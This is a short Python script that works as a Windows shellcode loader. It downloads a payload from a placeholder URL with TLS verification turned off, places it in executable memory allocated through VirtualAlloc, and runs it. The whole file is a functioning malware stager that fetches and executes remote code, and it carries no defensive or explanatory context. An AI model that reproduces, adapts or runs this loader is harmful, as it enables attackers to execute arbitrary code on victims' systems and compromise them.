import ctypes
import urllib.request
import ssl

ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

url = "%%url%%"

with urllib.request.urlopen(url, context=ssl_context) as response:
    shellcode = response.read()

shellcode_size = len(shellcode)

shellcode_buffer = ctypes.create_string_buffer(shellcode, shellcode_size)

MEM_COMMIT  = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
kernel32.VirtualAlloc.argtypes = (ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32)
kernel32.VirtualAlloc.restype = ctypes.c_void_p

ptr = kernel32.VirtualAlloc(None, ctypes.c_size_t(shellcode_size), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

if not ptr:
    raise MemoryError("Failed to allocate memory")

RtlMoveMemory = ctypes.cdll.msvcrt.memmove
RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
RtlMoveMemory.restype  = None

RtlMoveMemory(ctypes.c_void_p(ptr), ctypes.byref(shellcode_buffer), ctypes.c_size_t(shellcode_size))

shellcode_func = ctypes.CFUNCTYPE(None)(ptr)
shellcode_func()
